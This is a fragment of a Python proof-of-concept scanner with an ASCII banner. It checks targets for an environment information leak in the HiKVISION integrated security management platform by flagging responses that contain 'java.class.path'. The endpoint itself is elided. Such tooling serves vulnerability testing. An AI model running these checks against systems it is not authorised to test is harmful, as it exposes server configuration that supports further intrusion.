...
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                      
                                             ...
                                             version:HiKVISION综合安防管理平台env信息泄漏
...
def poc(target):
    ...
    # print(re.text)
    try:
        re = requests.get(url=url,verify=False,timeout=20)
        if re.status_code == 200 and 'java.class.path' in re.text:
            print(f'[+++]该{target}HiKVISION综合安防管理平台env信息泄漏')
